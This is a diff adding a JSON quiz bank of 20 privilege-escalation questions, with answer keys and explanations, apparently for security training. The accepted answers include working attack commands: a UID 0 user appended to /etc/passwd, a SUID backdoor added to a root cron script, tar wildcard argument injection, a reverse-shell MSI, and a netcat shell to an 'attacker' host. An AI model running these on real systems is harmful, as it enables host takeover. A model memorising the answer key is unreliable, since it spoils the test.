@@ -1,0 +1,375 @@
+[
+  {
+    "id": "vq-privesc-01",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "easy",
+    "question": "What command finds all SUID binaries on a Linux system?",
+    "correct_answers": [
+      "find / -perm -4000 -type f 2>/dev/null",
+      "find / -perm -u=s -type f 2>/dev/null",
+      "find / -perm -4000",
+      "find / -perm /4000"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "SUID binaries run with the file owner's privileges (often root). Finding unusual SUID binaries is a common privilege escalation vector. The -perm -4000 flag matches the SUID bit.",
+    "hints": [
+      "Use find with permission flags to locate the SUID bit"
+    ]
+  },
+  {
+    "id": "vq-privesc-02",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "easy",
+    "question": "What command checks what sudo privileges the current user has?",
+    "correct_answers": [
+      "sudo -l",
+      "sudo --list",
+      "sudo -ll"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "sudo -l lists the commands the current user can run with sudo, including any NOPASSWD entries. This is one of the first checks in Linux privilege escalation.",
+    "hints": [
+      "A sudo flag that lists your allowed commands"
+    ]
+  },
+  {
+    "id": "vq-privesc-03",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "medium",
+    "question": "You find a writable cron job running as root that executes /opt/backup.sh every 5 minutes. How do you escalate privileges?",
+    "correct_answers": [
+      "Replace or modify /opt/backup.sh to include a reverse shell or add your user to sudoers",
+      "Add a reverse shell to backup.sh",
+      "echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/backup.sh",
+      "Modify the script to set SUID on bash or add reverse shell"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "If a root cron job executes a script you can write to, inject commands that will run as root: add a reverse shell, copy bash with SUID, or add your user to /etc/sudoers.",
+    "hints": [
+      "The script runs as root and you can modify it"
+    ]
+  },
+  {
+    "id": "vq-privesc-04",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What Linux command lists all capabilities assigned to binaries?",
+    "correct_answers": [
+      "getcap -r / 2>/dev/null",
+      "getcap -r /",
+      "/sbin/getcap -r / 2>/dev/null"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Linux capabilities grant specific root privileges to binaries without full SUID. getcap -r recursively lists all binaries with capabilities. Dangerous ones include cap_setuid, cap_dac_override, and cap_sys_admin.",
+    "hints": [
+      "Use getcap recursively from the root directory"
+    ]
+  },
+  {
+    "id": "vq-privesc-05",
+    "topic_id": "privilege_escalation",
+    "type": "theory",
+    "difficulty": "medium",
+    "question": "What is the difference between vertical and horizontal privilege escalation?",
+    "correct_answers": [
+      "Vertical escalation gains higher privileges (user to root), horizontal gains access to another user at the same privilege level",
+      "Vertical goes from low to high privilege, horizontal moves to a different account at the same level",
+      "Vertical = gaining admin/root, horizontal = accessing another user's account"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Vertical privilege escalation moves from lower to higher privileges (e.g., user to root/admin). Horizontal privilege escalation accesses another account at the same privilege level (e.g., user A accessing user B's data).",
+    "hints": [
+      "Think about direction: up vs sideways"
+    ]
+  },
+  {
+    "id": "vq-privesc-06",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "On a Windows machine, you find an unquoted service path: C:\\Program Files\\Vulnerable App\\Service.exe running as SYSTEM. How do you exploit this?",
+    "correct_answers": [
+      "Place a malicious executable at C:\\Program.exe or C:\\Program Files\\Vulnerable.exe",
+      "Create Program.exe in C:\\ or Vulnerable.exe in C:\\Program Files\\",
+      "Drop a payload at a path that Windows will try before the intended executable"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Windows resolves unquoted paths with spaces by trying each possible interpretation: C:\\Program.exe, C:\\Program Files\\Vulnerable.exe, then C:\\Program Files\\Vulnerable App\\Service.exe. Placing a malicious binary at an earlier path hijacks execution.",
+    "hints": [
+      "Windows tries multiple path interpretations when spaces exist in unquoted paths"
+    ]
+  },
+  {
+    "id": "vq-privesc-07",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "hard",
+    "question": "What automated tool checks for common Linux privilege escalation vectors and outputs a report?",
+    "correct_answers": [
+      "linpeas",
+      "linpeas.sh",
+      "LinPEAS",
+      "linux-exploit-suggester",
+      "linenum"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "LinPEAS (Linux Privilege Escalation Awesome Script) automatically checks for SUID binaries, capabilities, writable paths, cron jobs, kernel exploits, and dozens of other escalation vectors with color-coded output.",
+    "hints": [
+      "A popular bash/python script from the PEASS-ng suite"
+    ]
+  },
+  {
+    "id": "vq-privesc-08",
+    "topic_id": "privilege_escalation",
+    "type": "theory",
+    "difficulty": "hard",
+    "question": "What is a Potato attack on Windows and what privilege does it escalate from?",
+    "correct_answers": [
+      "Potato attacks escalate from service accounts (SeImpersonatePrivilege) to SYSTEM by abusing Windows token impersonation",
+      "Exploits SeImpersonatePrivilege to get SYSTEM via token impersonation",
+      "Escalates from SeImpersonate/SeAssignPrimaryToken to SYSTEM using NTLM relay or named pipes"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Potato attacks (Hot Potato, Juicy Potato, Sweet Potato, PrintSpoofer) exploit SeImpersonatePrivilege held by service accounts (IIS, SQL Server) to impersonate SYSTEM tokens. They abuse Windows authentication mechanisms to capture and impersonate high-privilege tokens.",
+    "hints": [
+      "These attacks abuse token impersonation privileges commonly held by service accounts"
+    ]
+  },
+  {
+    "id": "vq-privesc-09",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "medium",
+    "question": "You find that /etc/passwd is world-writable. How can you escalate to root?",
+    "correct_answers": [
+      "Add a new user with UID 0 and a known password hash to /etc/passwd",
+      "Add a root-level user: echo 'hacker:password_hash:0:0::/root:/bin/bash' >> /etc/passwd",
+      "Write a new entry with UID 0 to /etc/passwd",
+      "openssl passwd to generate hash then add user with UID 0"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "If /etc/passwd is writable, add a new user with UID 0 (root equivalent). Generate a password hash with openssl passwd and create an entry like: hacker:$hash:0:0::/root:/bin/bash",
+    "hints": [
+      "UID 0 means root privileges regardless of the username"
+    ]
+  },
+  {
+    "id": "vq-privesc-10",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What Windows command lists all services and their configurations to find weak permissions?",
+    "correct_answers": [
+      "sc query state= all",
+      "wmic service get name,pathname,startmode",
+      "Get-Service",
+      "accesschk.exe -uwcqv * /accepteula"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "sc query lists services, wmic shows paths and start modes, and accesschk (Sysinternals) checks service permissions. Look for services with weak DACLs, unquoted paths, or writable binary paths.",
+    "hints": [
+      "Use sc, wmic, or Sysinternals accesschk to enumerate service configurations"
+    ]
+  },
+  {
+    "id": "vq-privesc-11",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You discover the current user is a member of the 'docker' group. How can you escalate to root?",
+    "correct_answers": [
+      "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+      "Mount the host filesystem into a container and access it as root",
+      "docker run -v /:/host -it ubuntu chroot /host",
+      "Run a privileged container with the host root filesystem mounted"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Docker group membership allows running containers. By mounting the host's root filesystem (-v /:/mnt) into a container, you gain root access to the entire host filesystem. You can then modify /etc/shadow, add SSH keys, or create SUID binaries.",
+    "hints": [
+      "Docker containers run as root and can mount the host filesystem"
+    ]
+  },
+  {
+    "id": "vq-privesc-12",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "If /etc/passwd is writable, what command adds a new root-equivalent user?",
+    "correct_answers": [
+      "echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd",
+      "openssl passwd -1 password then echo 'hacker:hash:0:0::/root:/bin/bash' >> /etc/passwd",
+      "echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Generate a password hash with 'openssl passwd -1 password', then append a new user entry with UID 0 (root equivalent) to /etc/passwd. The format is username:hash:0:0:comment:/root:/bin/bash. Then su to the new user.",
+    "hints": [
+      "Generate a hash with openssl passwd, then append a UID 0 user entry"
+    ]
+  },
+  {
+    "id": "vq-privesc-13",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "A script running as root uses a relative path to call 'backup' without specifying the full path. How do you exploit this via PATH hijacking?",
+    "correct_answers": [
+      "Create a malicious 'backup' binary in a directory you control, then prepend that directory to PATH",
+      "echo '/bin/bash' > /tmp/backup && chmod +x /tmp/backup && export PATH=/tmp:$PATH",
+      "Create a fake 'backup' script with a reverse shell and modify PATH to find it first",
+      "Write malicious binary named 'backup' and add its directory to the beginning of PATH"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "PATH hijacking exploits programs that call other binaries without absolute paths. Create a malicious binary with the same name in a writable directory, then prepend that directory to PATH. When the root script runs, it executes your malicious version instead.",
+    "hints": [
+      "The system searches PATH directories in order - put your malicious binary first"
+    ]
+  },
+  {
+    "id": "vq-privesc-14",
+    "topic_id": "privilege_escalation",
+    "type": "theory",
+    "difficulty": "hard",
+    "question": "What is LD_PRELOAD privilege escalation and what condition makes it exploitable?",
+    "correct_answers": [
+      "LD_PRELOAD loads a shared library before all others. If sudo allows env_keep+=LD_PRELOAD, you can inject a malicious library that runs as root.",
+      "Exploitable when sudo preserves LD_PRELOAD - inject a shared library that spawns a root shell",
+      "A shared library loaded before all others. If sudo keeps LD_PRELOAD in env_keep, a malicious .so runs as root"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "LD_PRELOAD specifies shared libraries loaded before all others. If 'sudo -l' shows env_keep+=LD_PRELOAD, compile a malicious .so with an __attribute__((constructor)) function that spawns a shell, then run: sudo LD_PRELOAD=/tmp/evil.so allowed_command.",
+    "hints": [
+      "Check if sudo preserves this environment variable that controls library loading"
+    ]
+  },
+  {
+    "id": "vq-privesc-15",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You find a Windows service with a writable binary path and the service runs as SYSTEM. How do you exploit DLL hijacking?",
+    "correct_answers": [
+      "Place a malicious DLL in the application directory that the service loads, then restart the service",
+      "Identify a missing DLL the service tries to load, place your malicious DLL in the search path",
+      "Create a DLL with the expected name containing a reverse shell in DllMain, place it where the service searches",
+      "Use Process Monitor to find missing DLLs, then plant a malicious DLL in the search order"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "DLL hijacking exploits Windows DLL search order. If a service loads a DLL from a writable location (or a DLL is missing), place a malicious DLL there. When the service restarts, it loads your DLL as SYSTEM. Use Process Monitor to identify DLL load attempts.",
+    "hints": [
+      "Windows searches for DLLs in a specific order - exploit a writable location in that order"
+    ]
+  },
+  {
+    "id": "vq-privesc-16",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What registry key indicates AlwaysInstallElevated is enabled, and how do you exploit it?",
+    "correct_answers": [
+      "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated = 1. Exploit with msfvenom -p windows/shell_reverse_tcp -f msi > shell.msi then msiexec /i shell.msi",
+      "AlwaysInstallElevated in both HKLM and HKCU must be set to 1. Create malicious MSI to get SYSTEM.",
+      "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
+      "msfvenom -f msi payload then msiexec /quiet /i shell.msi"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges. Both HKLM and HKCU registry keys must be set to 1. Generate a malicious MSI with msfvenom (-f msi) and install it with msiexec to get SYSTEM.",
+    "hints": [
+      "This policy allows MSI installations to run with elevated privileges"
+    ]
+  },
+  {
+    "id": "vq-privesc-17",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "hard",
+    "question": "What tool exploits SeImpersonatePrivilege on modern Windows (Server 2019+) to escalate to SYSTEM?",
+    "correct_answers": [
+      "PrintSpoofer",
+      "PrintSpoofer.exe -i -c cmd",
+      "PrintSpoofer -c 'nc.exe attacker 4444 -e cmd.exe'",
+      "GodPotato"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "PrintSpoofer exploits SeImpersonatePrivilege by abusing the Print Spooler service to capture a SYSTEM token. It works on Windows 10/Server 2016-2019 where older Potato attacks may fail. Usage: PrintSpoofer.exe -i -c cmd for an interactive SYSTEM shell.",
+    "hints": [
+      "A tool that abuses the Print Spooler service for token impersonation"
+    ]
+  },
+  {
+    "id": "vq-privesc-18",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "You need to select a kernel exploit for a Linux target. What information do you need and what tool helps identify applicable exploits?",
+    "correct_answers": [
+      "Need kernel version (uname -r) and distribution. Use linux-exploit-suggester or searchsploit to find matching exploits.",
+      "uname -r for kernel version, then use linux-exploit-suggester.sh or linux-exploit-suggester-2",
+      "Get kernel version with uname -a, check with linux-exploit-suggester or searchsploit linux kernel"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "Kernel exploit selection requires: exact kernel version (uname -r), distribution and version (cat /etc/os-release), architecture (uname -m). Tools: linux-exploit-suggester.sh compares the kernel version against known exploits and suggests applicable ones with download links.",
+    "hints": [
+      "You need the exact kernel version and a tool that matches it against known exploits"
+    ]
+  },
+  {
+    "id": "vq-privesc-19",
+    "topic_id": "privilege_escalation",
+    "type": "command",
+    "difficulty": "medium",
+    "question": "What tool monitors Linux processes without root to discover cron jobs and scheduled tasks running as other users?",
+    "correct_answers": [
+      "pspy",
+      "pspy64",
+      "./pspy64 -pf -i 1000",
+      "pspy32"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "pspy monitors Linux processes without needing root privileges by scanning /proc. It reveals cron jobs, systemd timers, and other scheduled tasks run by root or other users that you normally couldn't see, helping identify privilege escalation opportunities.",
+    "hints": [
+      "A tool that watches process creation events without requiring root access"
+    ]
+  },
+  {
+    "id": "vq-privesc-20",
+    "topic_id": "privilege_escalation",
+    "type": "scenario",
+    "difficulty": "hard",
+    "question": "A root cron job runs: tar czf /tmp/backup.tar.gz * in /opt/data/. How do you exploit wildcard injection to escalate privileges?",
+    "correct_answers": [
+      "Create files named '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' in /opt/data/ to inject tar arguments",
+      "touch '/opt/data/--checkpoint=1' && touch '/opt/data/--checkpoint-action=exec=sh privesc.sh'",
+      "Create filenames that tar interprets as command-line arguments using checkpoint actions",
+      "Wildcard expansion turns filenames into tar flags: --checkpoint and --checkpoint-action=exec"
+    ],
+    "validation_type": "contains_any",
+    "required_keywords": [],
+    "explanation": "When tar uses a wildcard (*), filenames are expanded as arguments. Create files named '--checkpoint=1' and '--checkpoint-action=exec=sh script.sh' in the target directory. When tar runs, these filenames become arguments that execute your script as root.",
+    "hints": [
+      "Shell wildcard expansion treats filenames starting with -- as command arguments"
+    ]
+  }
+]
